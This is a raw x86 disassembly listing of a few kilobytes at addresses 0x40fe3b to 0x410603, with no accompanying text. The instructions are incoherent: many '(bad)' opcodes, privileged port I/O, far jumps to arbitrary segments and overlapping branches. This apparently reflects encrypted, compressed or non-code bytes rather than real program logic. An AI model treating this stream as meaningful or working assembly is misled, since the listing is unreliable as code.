  40fe3b:	push   ss
  40fe3c:	push   edx
  40fe3d:	aam    0x8f
  40fe3f:	aas    
  40fe40:	(bad)  
  40fe42:	icebp  
  40fe43:	aad    0xd8
  40fe45:	xor    ebp,DWORD PTR [esi-0x33]
  40fe48:	nop
  40fe49:	jae    0x40feab
  40fe4b:	lods   eax,DWORD PTR ds:[esi]
  40fe4c:	push   cs
  40fe4d:	mov    cl,0x87
  40fe4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe50:	retf   
  40fe51:	dec    edi
  40fe52:	jne    0x40fece
  40fe54:	daa    
  40fe55:	aam    0x5d
  40fe57:	mov    edi,0x1993b5a5
  40fe5c:	pushf  
  40fe5d:	mov    esp,0x885f3b9e
  40fe62:	nop
  40fe63:	and    DWORD PTR [ebx+0x11],0xffffff9c
  40fe67:	inc    eax
  40fe68:	cmp    al,0xeb
  40fe6a:	mov    edi,0x22fd581d
  40fe6f:	jmp    0xa39:0xdbd06139
  40fe76:	jne    0x40feac
  40fe78:	out    0xd5,eax
  40fe7a:	sbb    ebx,ecx
  40fe7c:	and    ebp,DWORD PTR [edx]
  40fe7e:	imul   esi,esi,0x6f80eb66
  40fe84:	add    bl,ah
  40fe86:	xchg   BYTE PTR [bp+di-0x26],cl
  40fe8a:	xor    DWORD PTR [edi+0x3f],esi
  40fe8d:	jb     0x40fee1
  40fe8f:	dec    edi
  40fe90:	xchg   esp,eax
  40fe91:	shl    ebp,0x3e
  40fe94:	mov    esp,0x2e4a302b
  40fe99:	push   ebx
  40fe9a:	add    bl,BYTE PTR [edi+0x6f68532d]
  40fea0:	out    0xf9,eax
  40fea2:	pop    eax
  40fea3:	retf   
  40fea4:	xchg   esp,eax
  40fea5:	push   eax
  40fea6:	jg     0x40fe32
  40fea8:	shl    DWORD PTR [ebp+0x3895132],cl
  40feae:	cmp    al,BYTE PTR [edx]
  40feb0:	ins    DWORD PTR es:[edi],dx
  40feb1:	adc    DWORD PTR [ebx],eax
  40feb3:	icebp  
  40feb4:	xor    BYTE PTR [ebp+0x33d264be],ah
  40feba:	mov    dh,0x7e
  40febc:	ja     0x40fef9
  40febe:	and    BYTE PTR [eax-0x3b5f7e95],al
  40fec4:	fisubr WORD PTR [ecx]
  40fec6:	add    cl,BYTE PTR [ecx+0x1c62fc33]
  40fecc:	push   0x154f1ff
  40fed1:	xlat   BYTE PTR ds:[ebx]
  40fed2:	popf   
  40fed3:	jg     0x40ff11
  40fed5:	scas   eax,DWORD PTR es:[edi]
  40fed6:	add    DWORD PTR [ebx+0x38],ebp
  40fed9:	packuswb mm1,mm5
  40fedc:	js     0x40ff09
  40fede:	jns    0x40fee4
  40fee0:	and    al,0xce
  40fee2:	or     dl,0x3a
  40fee5:	add    cl,dl
  40fee7:	sahf   
  40fee8:	ins    DWORD PTR es:[edi],dx
  40fee9:	mov    eax,0xa4da5fbf
  40feee:	int3   
  40feef:	lds    esi,FWORD PTR [edi-0x3d]
  40fef2:	pop    esp
  40fef3:	ret    0xe041
  40fef6:	and    dl,ch
  40fef8:	cmp    esp,eax
  40fefa:	cmp    DWORD PTR [edx+0x32a7a37c],ecx
  40ff00:	stc    
  40ff01:	cmp    al,0x3d
  40ff03:	jl     0x40ff15
  40ff05:	cmp    bh,0x34
  40ff08:	cmp    ecx,DWORD PTR [edi]
  40ff0a:	jmp    0xd46c850a
  40ff0f:	(bad)  
  40ff10:	jbe    0x40ff65
  40ff12:	iret   
  40ff13:	loopne 0x40ff5a
  40ff15:	sub    esp,DWORD PTR [edx]
  40ff17:	and    esi,DWORD PTR [edi]
  40ff19:	clc    
  40ff1a:	jno    0x40fef1
  40ff1c:	xor    dh,BYTE PTR [ebx+ebx*2+0x1e81592c]
  40ff23:	lods   eax,DWORD PTR gs:[esi]
  40ff25:	inc    eax
  40ff26:	jo     0x40ff08
  40ff28:	sub    DWORD PTR [edi],ebx
  40ff2a:	inc    esp
  40ff2b:	sbb    ecx,DWORD PTR [esi-0xe]
  40ff2e:	jne    0x40feb1
  40ff30:	leave  
  40ff31:	loope  0x40ff1e
  40ff33:	popa   
  40ff34:	sti    
  40ff35:	xchg   ebp,eax
  40ff36:	aas    
  40ff37:	xor    DWORD PTR gs:[eax],edi
  40ff3a:	(bad)  
  40ff3b:	ror    esp,0x3e
  40ff3e:	sbb    DWORD PTR [edi],ebx
  40ff40:	jo     0x40ff11
  40ff42:	idiv   cl
  40ff44:	out    0xb7,eax
  40ff46:	out    dx,eax
  40ff47:	ror    DWORD PTR [ebx],1
  40ff49:	xchg   ebp,eax
  40ff4a:	shr    DWORD PTR [edi-0x4af949b4],cl
  40ff50:	jp     0x40fee7
  40ff52:	push   edi
  40ff53:	pusha  
  40ff54:	in     al,dx
  40ff55:	dec    edi
  40ff56:	addr16 adc eax,0x7d495676
  40ff5c:	aad    0x83
  40ff5e:	sbb    al,0x19
  40ff60:	sar    ch,0xe8
  40ff63:	outs   dx,BYTE PTR ds:[esi]
  40ff64:	fstp   TBYTE PTR [edi-0x65]
  40ff67:	cmp    eax,0x7bc7f2b7
  40ff6c:	iret   
  40ff6d:	mov    DWORD PTR [esi-0x51],ebx
  40ff70:	int3   
  40ff71:	mov    edx,0x772db5f
  40ff76:	call   0x45b1:0x40f3f099
  40ff7d:	jge    0x40ff91
  40ff7f:	and    eax,0xbe58dd8e
  40ff84:	fild   WORD PTR gs:[edi+0x4a9e3131]
  40ff8b:	jbe    0x40ff9f
  40ff8d:	test   DWORD PTR [esi-0x24b7177f],0xdd79bdda
  40ff97:	sub    DWORD PTR [esi+ebp*1+0x35d085c6],esi
  40ff9e:	jp     0x40ffbf
  40ffa0:	push   ebp
  40ffa1:	inc    esi
  40ffa2:	es pop ss
  40ffa4:	daa    
  40ffa5:	pop    ss
  40ffa6:	mov    al,0xa2
  40ffa8:	cmp    dl,BYTE PTR [eax-0x30]
  40ffab:	retf   0x5b11
  40ffae:	mov    bh,0x94
  40ffb0:	sub    DWORD PTR [esi-0x22a5f6f9],0x747dac17
  40ffba:	test   DWORD PTR [edx],edi
  40ffbc:	nop
  40ffbd:	inc    ebp
  40ffbe:	imul   ebp,DWORD PTR [ecx],0xffffffde
  40ffc1:	mov    al,0x10
  40ffc3:	mov    ch,0xd8
  40ffc5:	add    al,0xa9
  40ffc7:	sub    ebp,DWORD PTR [eax+0x2e]
  40ffca:	(bad)  
  40ffcb:	mov    dh,0xa0
  40ffcd:	mov    bl,0xd6
  40ffcf:	xor    DWORD PTR [esi+0x41ca48cd],0xa131ebec
  40ffd9:	add    esp,DWORD PTR ds:0x65aa385d
  40ffdf:	cmp    eax,0x5c018cb
  40ffe4:	(bad)  
  40ffe5:	lahf   
  40ffe6:	jge    0x410012
  40ffe8:	icebp  
  40ffe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffea:	push   eax
  40ffeb:	idiv   DWORD PTR [ebp+ebp*1+0x6357b36e]
  40fff2:	pop    esp
  40fff3:	int    0xde
  40fff5:	xor    ah,BYTE PTR [eax+0x32693c43]
  40fffb:	inc    edi
  40fffc:	pop    ds
  40fffd:	ret    
  40fffe:	sub    DWORD PTR [ebp+0x46],esp
  410001:	mov    dh,0x32
  410004:	out    dx,eax
  410005:	mov    bl,0x6a
  410007:	stc    
  410008:	and    ecx,esi
  41000a:	jnp    0x41002a
  41000c:	and    eax,0xe564d005
  410011:	rcl    DWORD PTR [ecx+0x61941220],0x51
  410018:	sbb    DWORD PTR [esi+0x60],edx
  41001b:	or     BYTE PTR [ebp+0x4cbe2cc3],cl
  410021:	xor    bh,BYTE PTR [edx+ecx*8+0x44f69f66]
  410028:	stc    
  410029:	ror    al,cl
  41002b:	and    BYTE PTR [ebx],ch
  41002d:	mov    ah,BYTE PTR [ebx]
  41002f:	pusha  
  410030:	outs   dx,BYTE PTR ds:[esi]
  410031:	stos   BYTE PTR es:[edi],al
  410032:	mov    esi,0x5bc5300b
  410037:	xchg   ebp,eax
  410038:	cmc    
  410039:	mov    cl,0x16
  41003b:	push   0x1f5c5a8f
  410040:	jo     0x410090
  410042:	cmp    ecx,esi
  410044:	jmp    0xfb8382b4
  410049:	push   ecx
  41004a:	js     0x4100a7
  41004c:	lock mov ebp,0x71bacf93
  410052:	lock mov DWORD PTR [ebp+0x32d8009a],edx
  410059:	ficom  DWORD PTR [eax]
  41005b:	push   ss
  41005c:	stos   BYTE PTR es:[edi],al
  41005d:	daa    
  41005e:	out    0x64,eax
  410060:	or     al,0x4f
  410062:	loop   0x4100db
  410064:	jmp    0x85626d22
  410069:	imul   esp,DWORD PTR [edi+0x663a40da],0x10
  410070:	fs jp  0x41006b
  410073:	sub    al,0xe6
  410075:	pop    eax
  410076:	mov    bl,0xa5
  410078:	mov    esp,0x29460049
  41007d:	jle    0x410006
  41007f:	sub    DWORD PTR [ebp+0x7146e2ec],0x3d8c603e
  410089:	dec    eax
  41008a:	jno    0x4100f1
  41008c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41008d:	retf   0xa7d1
  410090:	popa   
  410091:	pop    ss
  410092:	push   cs
  410093:	je     0x4100e7
  410095:	add    cl,al
  410097:	rcr    ebx,0x5b
  41009a:	data16 jo 0x4100ce
  41009d:	lahf   
  41009e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41009f:	mov    edx,0x89f843fd
  4100a4:	rcr    BYTE PTR [ebx],1
  4100a6:	or     BYTE PTR [esi+0x37],al
  4100a9:	es push esp
  4100ab:	ds dec ecx
  4100ad:	shl    DWORD PTR [edi+esi*1],cl
  4100b0:	pusha  
  4100b1:	mov    cl,0x47
  4100b3:	sub    al,0x81
  4100b5:	sbb    eax,0x5fcbaa4f
  4100ba:	lock xlat BYTE PTR ds:[ebx]
  4100bc:	test   BYTE PTR [eax],cl
  4100be:	pop    es
  4100bf:	mov    eax,ds:0x69eee28a
  4100c4:	bound  ecx,QWORD PTR [esi+0x66e3a6f]
  4100ca:	mov    eax,0xda451e9b
  4100cf:	aas    
  4100d0:	sub    DWORD PTR [edi-0x174bf11a],ebp
  4100d6:	retf   
  4100d7:	or     DWORD PTR [esi],esi
  4100d9:	or     ebx,esi
  4100db:	sub    edi,esi
  4100dd:	jbe    0x410124
  4100df:	inc    ecx
  4100e0:	sub    DWORD PTR [ecx+edi*4+0x6c18dd6c],ebx
  4100e7:	jbe    0x41013e
  4100e9:	sub    eax,0xdfcb2cad
  4100ee:	inc    ebx
  4100ef:	adc    bl,bl
  4100f1:	cmp    esp,DWORD PTR [ebp+0x5f8d72bb]
  4100f7:	jmp    0xe401:0x2ac6890e
  4100fe:	mov    bh,0x6c
  410100:	out    dx,eax
  410101:	jle    0x410135
  410103:	test   eax,0x5ec7b6b2
  410108:	fsub   DWORD PTR ds:[esi+0x70]
  41010c:	sti    
  41010d:	or     ah,BYTE PTR [ebp+0x570b3c3a]
  410113:	lea    eax,[ebx+0x478d3088]
  410119:	inc    edi
  41011a:	pop    ss
  41011b:	fsub   DWORD PTR [esi+ecx*2+0x1b707ad0]
  410122:	adc    ecx,esi
  410124:	mov    al,0x4a
  410126:	add    eax,0x17472707
  41012b:	mov    edi,0xf56c2bc1
  410130:	mov    cl,ah
  410132:	int3   
  410133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410134:	mov    eax,0x219fc09
  410139:	mov    ecx,0x9d61e760
  41013e:	call   0x86ef:0x2fa64f6a
  410145:	das    
  410146:	mov    esp,0x4d84bd27
  41014b:	push   ecx
  41014c:	mov    fs,WORD PTR [ebx-0x640bb2c3]
  410152:	call   0xf834a9b8
  410157:	sub    BYTE PTR [ecx-0x7b],bl
  41015a:	cmp    al,0xba
  41015c:	cdq    
  41015d:	push   ss
  41015e:	ror    DWORD PTR [esi+edi*8+0x74],0x2f
  410163:	ret    
  410164:	addr16 mov bl,0xe4
  410167:	call   0x18c02211
  41016c:	mov    bl,0xa0
  41016e:	addr16 das 
  410170:	data16 mov WORD PTR [ebp+0x18d88ff7],fs
  410177:	ds inc edx
  410179:	jmp    0x3aea0063
  41017e:	sub    eax,0x9e3d828
  410183:	into   
  410184:	test   DWORD PTR [ecx+0x56],0x636b3b01
  41018b:	neg    BYTE PTR [ecx]
  41018d:	js     0x410203
  41018f:	push   ebx
  410190:	sar    BYTE PTR [edi+0x473cf234],cl
  410196:	cmp    DWORD PTR [esi-0x7],esp
  410199:	leave  
  41019a:	ja     0x41021a
  41019c:	aas    
  41019d:	jbe    0x41019c
  41019f:	cmp    al,0x82
  4101a1:	add    BYTE PTR ds:0xe019dd2e,0xf6
  4101a8:	out    0x5e,eax
  4101aa:	inc    esp
  4101ab:	fidivr WORD PTR [eax-0x4869fcae]
  4101b1:	bound  edi,QWORD PTR [ebp+0x50fb4f41]
  4101b7:	clc    
  4101b8:	mov    ds:0xd1be9851,al
  4101bd:	loope  0x41014a
  4101bf:	pop    edx
  4101c0:	repz inc edi
  4101c2:	mov    WORD PTR [ebx+edi*8],ds
  4101c5:	and    ebx,eax
  4101c7:	(bad)  
  4101c9:	or     BYTE PTR [edi],ah
  4101cb:	xor    DWORD PTR fs:[ecx],eax
  4101ce:	mul    eax
  4101d0:	cli    
  4101d1:	int3   
  4101d2:	int3   
  4101d3:	mov    edx,0xf91a26b8
  4101d8:	fadd   QWORD PTR [ebx-0x68f4d935]
  4101de:	jbe    0x4101b5
  4101e0:	shl    BYTE PTR [ebp+esi*4+0x4d],cl
  4101e4:	dec    esi
  4101e5:	or     esi,DWORD PTR [ebp+0x22]
  4101e8:	and    al,0x9d
  4101ea:	mov    al,0xcc
  4101ec:	stos   DWORD PTR es:[edi],eax
  4101ed:	shl    BYTE PTR [ebx-0x16],cl
  4101f0:	or     ecx,DWORD PTR [eax]
  4101f2:	enter  0xf259,0xbe
  4101f6:	rcr    DWORD PTR [eax+esi*8+0x3304ba7c],1
  4101fd:	loope  0x4101a7
  4101ff:	push   esp
  410200:	and    DWORD PTR [edx],0xd3721b2c
  410206:	jae    0x41023f
  410208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410209:	(bad)
  41020e:	xor    BYTE PTR [edi+0x7589a32a],bh
  410214:	out    dx,al
  410215:	stc    
  410216:	and    al,0x9b
  410218:	jmp    FWORD PTR [ebx]
  41021a:	xor    ah,BYTE PTR [ecx]
  41021c:	xchg   edx,eax
  41021d:	mov    al,0x84
  41021f:	stos   BYTE PTR es:[edi],al
  410220:	rol    cl,1
  410222:	mov    BYTE PTR [eax-0x34955573],ah
  410228:	xchg   ebx,eax
  410229:	adc    dl,cl
  41022b:	jge    0x410248
  41022d:	dec    esp
  41022e:	(bad)  
  41022f:	pop    esp
  410230:	mov    ch,0x9b
  410232:	xchg   ecx,eax
  410233:	outs   dx,DWORD PTR ds:[esi]
  410234:	sbb    BYTE PTR [esi+ecx*8],bh
  410237:	rcl    ebx,1
  410239:	into   
  41023a:	xchg   BYTE PTR [esi+0x5b90b3ee],al
  410240:	and    eax,0x3b4248f9
  410245:	inc    eax
  410246:	mov    eax,ds:0xb1ba30ef
  41024b:	sbb    cl,0x9c
  41024e:	(bad)  
  41024f:	in     eax,dx
  410250:	mov    DWORD PTR [ebp+ecx*2+0x6e42a673],eax
  410257:	pop    ecx
  410258:	xchg   edi,eax
  410259:	ins    BYTE PTR es:[edi],dx
  41025a:	int    0x11
  41025c:	push   cs
  41025d:	jle    0x4101df
  41025f:	shr    BYTE PTR [eax+0x32],1
  410262:	js     0x4101ec
  410264:	stos   DWORD PTR es:[edi],eax
  410265:	push   ds
  410266:	call   0x19b215bb
  41026b:	add    eax,DWORD PTR [ebx-0x60f30e2c]
  410271:	int3   
  410272:	cmp    ebx,ecx
  410274:	dec    eax
  410275:	dec    esi
  410276:	jg     0x4102d6
  410278:	cmp    al,0xc9
  41027a:	add    al,BYTE PTR [edx]
  41027c:	mov    ebx,0x7aef7fa7
  410281:	test   al,0xf4
  410283:	shr    DWORD PTR [esi+0x49324436],1
  410289:	xchg   BYTE PTR es:[eax-0x1d8a2f4f],al
  410290:	(bad)  
  410291:	pop    ebx
  410292:	aam    0x86
  410294:	enter  0xe75f,0x35
  410298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410299:	xor    bh,ch
  41029b:	pop    ds
  41029c:	mov    DWORD PTR [esi],ebp
  41029e:	jnp    0x41027e
  4102a0:	adc    dh,BYTE PTR [esp+ebp*1+0x5a118d37]
  4102a7:	push   cs
  4102a8:	inc    edx
  4102a9:	jmp    0x7df7:0x4b73cce5
  4102b0:	lods   al,BYTE PTR ds:[esi]
  4102b1:	dec    ecx
  4102b2:	sbb    DWORD PTR [ecx-0x1b],ebx
  4102b5:	xlat   BYTE PTR ds:[ebx]
  4102b6:	xlat   BYTE PTR ds:[ebx]
  4102b7:	sub    eax,0xdc87e722
  4102bc:	cdq    
  4102bd:	aaa    
  4102be:	in     al,0xaf
  4102c0:	jmp    0xea5dda0f
  4102c5:	push   ebp
  4102c6:	dec    esp
  4102c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102c8:	add    esi,DWORD PTR [esi-0x2a]
  4102cb:	mov    ch,0xa6
  4102cd:	and    eax,0x204e6c12
  4102d2:	dec    edi
  4102d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102d4:	or     al,al
  4102d6:	fwait
  4102d7:	mov    dh,0xbb
  4102d9:	and    esp,0x3216e5c6
  4102df:	and    DWORD PTR [edx],esi
  4102e1:	sub    bh,BYTE PTR [ebp+0x46]
  4102e4:	jne    0x410284
  4102e6:	jb     0x4102a3
  4102e8:	pop    edi
  4102e9:	outs   dx,DWORD PTR ds:[esi]
  4102ea:	sbb    ah,cl
  4102ec:	cmp    dh,BYTE PTR [ebp-0x461a9d18]
  4102f2:	into   
  4102f3:	int3   
  4102f4:	mov    ebx,0xa936f3b4
  4102f9:	and    ebx,ecx
  4102fb:	scas   eax,DWORD PTR es:[edi]
  4102fc:	pusha  
  4102fd:	jmp    0x410317
  4102ff:	xchg   ebp,eax
  410300:	xchg   edx,eax
  410301:	lea    edi,[edx+0x51cf4c4c]
  410307:	cwde   
  410308:	mov    ch,0x10
  41030a:	jmp    0x410338
  41030c:	cmp    BYTE PTR ds:0x8de79a1d,bl
  410312:	push   es
  410313:	push   esp
  410314:	es dec esi
  410316:	cmp    edx,DWORD PTR [edi]
  410318:	(bad)  
  410319:	(bad)
  41031c:	cld    
  41031d:	je     0x410325
  41031f:	xchg   esi,eax
  410320:	addr16 mov ds:0x1eea,eax
  410324:	pop    edi
  410325:	sub    ch,bh
  410327:	rcr    DWORD PTR [esi],cl
  410329:	jno    0x410332
  41032b:	push   cs
  41032c:	fild   DWORD PTR [eax-0x49]
  41032f:	cmc    
  410330:	jg     0x4102b9
  410332:	cdq    
  410333:	push   eax
  410334:	adc    al,0xbd
  410336:	pop    eax
  410337:	xor    DWORD PTR [ebx],edi
  410339:	push   ecx
  41033a:	and    dl,BYTE PTR [edi+ebp*4]
  41033d:	in     eax,dx
  41033e:	jp     0x410397
  410340:	jo     0x410386
  410342:	int3   
  410343:	(bad)  
  410344:	adc    dh,BYTE PTR [ebx]
  410346:	mov    bl,0x57
  410348:	and    al,0x28
  41034a:	inc    esp
  41034b:	hlt    
  41034c:	pop    esp
  41034d:	and    DWORD PTR [esp+eax*2-0x21b625ce],0x4c6082b3
  410358:	inc    ebp
  410359:	push   0x93626471
  41035e:	(bad)  
  410360:	mov    edx,0x4303b3b7
  410365:	(bad)  
  410366:	enter  0xd61e,0xb0
  41036a:	and    DWORD PTR [ecx+0x7f],esp
  41036d:	jo     0x4103ed
  41036f:	mov    DWORD PTR [eax+0x2a61a6a7],0x7c285b77
  410379:	push   esp
  41037a:	das    
  41037b:	sbb    dl,ch
  41037d:	rol    DWORD PTR [edi],1
  41037f:	inc    ebx
  410380:	jne    0x41033c
  410382:	dec    edx
  410383:	fiadd  WORD PTR [edi]
  410385:	mov    ?,WORD PTR [eax-0xa]
  410388:	jl     0x410385
  41038a:	jb     0x410357
  41038c:	dec    ebp
  41038d:	mov    ebx,0x56a5c56b
  410392:	std    
  410393:	sub    eax,0x98e4b760
  410398:	adc    BYTE PTR [eax+0xb],ah
  41039b:	jae    0x41036e
  41039d:	sbb    al,0x67
  41039f:	cmc    
  4103a0:	push   ds
  4103a1:	inc    ecx
  4103a2:	adc    eax,0xacb5a038
  4103a7:	(bad)  
  4103a8:	mov    ah,0x12
  4103aa:	test   DWORD PTR [edx-0x126ab93c],eax
  4103b0:	sbb    edi,DWORD PTR [ebx]
  4103b2:	sub    DWORD PTR [edx-0x9046013],edi
  4103b8:	loope  0x410372
  4103ba:	fwait
  4103bb:	or     BYTE PTR [esi],ah
  4103bd:	jae    0x4103b5
  4103bf:	scas   eax,DWORD PTR es:[edi]
  4103c0:	stos   BYTE PTR es:[edi],al
  4103c1:	aad    0xe3
  4103c3:	pop    ebp
  4103c4:	push   ecx
  4103c5:	mov    edi,0x84b27e38
  4103ca:	dec    ebx
  4103cb:	and    esi,eax
  4103cd:	iret   
  4103ce:	cmc    
  4103cf:	js     0x4103a4
  4103d1:	es aas 
  4103d3:	cmp    al,0x65
  4103d5:	mov    bl,BYTE PTR [eax-0x2e]
  4103d8:	daa    
  4103d9:	and    al,0x35
  4103db:	aad    0x3f
  4103dd:	fmul   QWORD PTR [ebp+edx*2-0x2b6140c3]
  4103e4:	nop
  4103e5:	test   DWORD PTR [edi+ebx*1-0x27],edx
  4103e9:	sub    al,0x21
  4103eb:	jnp    0x410393
  4103ed:	push   ecx
  4103ee:	dec    edi
  4103ef:	xor    dh,BYTE PTR [edi+0x40]
  4103f2:	sub    DWORD PTR ds:0xdd9cee2,0x27
  4103f9:	jle    0x410417
  4103fb:	pusha  
  4103fc:	je     0x410425
  4103fe:	ins    BYTE PTR es:[edi],dx
  4103ff:	aas    
  410400:	jl     0x41039f
  410402:	inc    ecx
  410403:	loopne 0x410469
  410405:	loope  0x41038a
  410407:	sbb    cl,ch
  410409:	fisttp QWORD PTR [esp+ebp*1]
  41040c:	(bad)  
  41040d:	test   eax,0xfa9c34e3
  410412:	push   0xffffffe9
  410414:	lods   al,BYTE PTR ds:[esi]
  410415:	(bad)  
  410416:	scas   eax,DWORD PTR es:[edi]
  410417:	adc    dl,dl
  410419:	jno    0x4103fe
  41041b:	iret   
  41041c:	bound  ebx,QWORD PTR gs:[esi-0x1e]
  410420:	std    
  410421:	adc    dl,BYTE PTR [edx-0x5e]
  410424:	xchg   edx,eax
  410425:	xor    BYTE PTR [esi],0xed
  410428:	mov    DWORD PTR [edx-0x1900f754],edx
  41042e:	sbb    BYTE PTR [esi+0x45727b6],0x14
  410435:	pop    ebp
  410436:	sbb    edx,DWORD PTR [edx]
  410438:	dec    ebx
  410439:	test   BYTE PTR [esi-0x31305da2],cl
  41043f:	pop    edx
  410440:	iret   
  410441:	outs   dx,BYTE PTR ds:[esi]
  410442:	lea    ebx,[edi+0x22cf6fef]
  410448:	imul   ecx,DWORD PTR [edi+0x71b7339b],0x56ed17bf
  410452:	out    dx,al
  410453:	mov    esi,0xba6552c4
  410458:	fst    QWORD PTR [ebp+esi*2+0x67119ccd]
  41045f:	aas    
  410460:	popa   
  410461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410462:	mov    ch,0xbc
  410464:	or     DWORD PTR [ecx+0x17],edi
  410467:	push   0x606a6553
  41046c:	rcl    DWORD PTR [eax+0x73],0xb
  410470:	fstp   st(5)
  410472:	cdq    
  410473:	jae    0x410421
  410475:	cwde   
  410476:	popa   
  410477:	cmp    ebx,ecx
  410479:	cmp    BYTE PTR [ebx],dl
  41047b:	sub    BYTE PTR ds:0x9b5b0bc8,0xfc
  410482:	mov    esp,0xb527f859
  410487:	shl    esp,1
  410489:	outs   dx,BYTE PTR ds:[esi]
  41048a:	dec    esi
  41048b:	les    edx,FWORD PTR [ebx-0x56]
  41048e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41048f:	stos   BYTE PTR es:[edi],al
  410490:	rcl    edx,1
  410492:	std    
  410493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410494:	icebp  
  410495:	leave  
  410496:	jg     0x410455
  410498:	ds arpl cx,si
  41049b:	stos   BYTE PTR es:[edi],al
  41049c:	dec    esi
  41049d:	or     ecx,DWORD PTR [edi]
  41049f:	in     eax,dx
  4104a0:	repnz cmc 
  4104a2:	mov    al,0x9d
  4104a4:	loop   0x41050a
  4104a6:	mov    ch,0x43
  4104a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104a9:	sub    eax,0x23e558c8
  4104ae:	and    esp,DWORD PTR [edx-0x57]
  4104b1:	inc    ecx
  4104b2:	jge    0x4104e5
  4104b4:	pop    es
  4104b5:	stos   WORD PTR es:[edi],ax
  4104b7:	loopne 0x4104bc
  4104b9:	les    ebp,FWORD PTR [ecx]
  4104bb:	mov    edx,0x6cd299fe
  4104c0:	pop    ebx
  4104c1:	retf   
  4104c2:	in     eax,dx
  4104c3:	cmp    DWORD PTR [eax],edi
  4104c5:	add    al,0xeb
  4104c7:	jns    0x4104cb
  4104c9:	and    cl,dl
  4104cb:	iret   
  4104cc:	lea    ecx,[edi-0x68]
  4104cf:	lods   eax,DWORD PTR ds:[esi]
  4104d0:	pop    ecx
  4104d1:	cwde   
  4104d2:	adc    al,0xcd
  4104d4:	add    ch,BYTE PTR [eax]
  4104d6:	cmp    eax,DWORD PTR [edx]
  4104d8:	push   0x7183cd60
  4104dd:	inc    esp
  4104de:	mov    al,ds:0x595711a3
  4104e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104e4:	jmp    0x4104ee
  4104e6:	sbb    edi,eax
  4104e8:	inc    eax
  4104e9:	push   es
  4104ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104eb:	loopne 0x410478
  4104ed:	lea    ebp,[ecx+0x41]
  4104f0:	xor    BYTE PTR [edx+0x582154a],bl
  4104f6:	add    DWORD PTR [ebx+0x727efbca],edx
  4104fc:	cmp    al,0xea
  4104fe:	add    BYTE PTR [ecx],al
  410500:	hlt    
  410501:	jmp    0xa955643c
  410506:	pop    ebp
  410507:	xor    ch,ah
  410509:	call   0xbde9:0xb5ec6372
  410510:	xor    al,0xb4
  410512:	push   ds
  410513:	ret    0xabbc
  410516:	jmp    0x6b72:0x67585d98
  41051d:	das    
  41051e:	loopne 0x4104a0
  410520:	mov    dh,ah
  410522:	sbb    BYTE PTR [ebx-0x52],0xd
  410526:	sub    BYTE PTR [edi+0x65141bc9],bh
  41052c:	mov    ds:0xef589d3f,al
  410531:	bound  edx,QWORD PTR [ecx+0x4a]
  410534:	cli    
  410535:	add    edx,DWORD PTR [ebx]
  410537:	shl    ebp,1
  410539:	cs xchg edi,eax
  41053b:	push   ds
  41053c:	cdq    
  41053d:	pop    eax
  41053f:	fild   DWORD PTR [eax+0x1b]
  410542:	(bad)  
  410543:	loop   0x41053d
  410545:	je     0x41055c
  410547:	sub    DWORD PTR es:[edx-0x4b],ebp
  41054b:	pop    eax
  41054c:	out    0x9d,al
  41054e:	(bad)  
  410550:	(bad)  
  410551:	xchg   esi,eax
  410552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410553:	mov    bh,0xac
  410555:	(bad)  
  410556:	xor    al,BYTE PTR [edi]
  410558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410559:	sbb    bh,BYTE PTR [eax+eax*4]
  41055c:	and    BYTE PTR [eax-0x59],dl
  41055f:	jns    0x4104e5
  410561:	mov    al,0x84
  410563:	dec    ecx
  410564:	mov    eax,0xab24e1df
  410569:	aas    
  41056a:	lahf   
  41056b:	mov    al,BYTE PTR [edx-0xe991d5a]
  410571:	call   0xaaf61c8b
  410576:	icebp  
  410577:	xor    DWORD PTR [ecx],esi
  410579:	cs pop ds
  41057b:	mov    dh,0xfc
  41057d:	nop
  41057e:	lods   al,BYTE PTR ds:[esi]
  41057f:	imul   esp,DWORD PTR [ecx],0x4a8d3f53
  410585:	jne    0x410535
  410587:	and    al,0x84
  410589:	dec    ecx
  41058a:	pop    edx
  41058b:	add    al,0x12
  41058d:	jge    0x4105f4
  41058f:	mov    cl,0xa6
  410591:	mov    dh,0xdb
  410593:	(bad)  
  410594:	cmc    
  410595:	adc    bh,BYTE PTR [ebx-0x50]
  410598:	sub    ah,0xd4
  41059b:	and    BYTE PTR [ebx],0xd0
  41059e:	shr    BYTE PTR [esi-0x74],1
  4105a1:	adc    eax,0xf3d4c9e3
  4105a6:	stos   BYTE PTR es:[edi],al
  4105a7:	in     al,dx
  4105a8:	jge    0x410572
  4105aa:	call   0x2a6d37ce
  4105af:	repnz cmp DWORD PTR [eax+0x71],0xd86e9dde
  4105b7:	call   0xc1665a1b
  4105bc:	cmc    
  4105bd:	xchg   ebx,eax
  4105be:	xchg   ebp,eax
  4105bf:	sbb    DWORD PTR [ebx-0x17],eax
  4105c2:	add    eax,0xaad84aa0
  4105c7:	loop   0x4105c0
  4105c9:	or     ebp,edx
  4105cb:	les    ebp,FWORD PTR [edi+ecx*1+0x550663be]
  4105d2:	repz add eax,0xc97bd3fb
  4105d8:	push   ss
  4105d9:	dec    edx
  4105da:	imul   ebx,DWORD PTR [ecx-0x6b5e3c86],0x499e321f
  4105e4:	push   edi
  4105e5:	lea    edx,[ecx-0x17f937d1]
  4105eb:	or     BYTE PTR ds:0x5a74a34,al
  4105f1:	test   BYTE PTR [edi],dh
  4105f3:	mov    bl,0x10
  4105f5:	jge    0x4105a7
  4105f7:	sbb    eax,0x5c0051c6
  4105fc:	adc    esp,DWORD PTR [edx-0x3cfa66b1]
  410602:	inc    ecx
  410603:	or     bl,dl
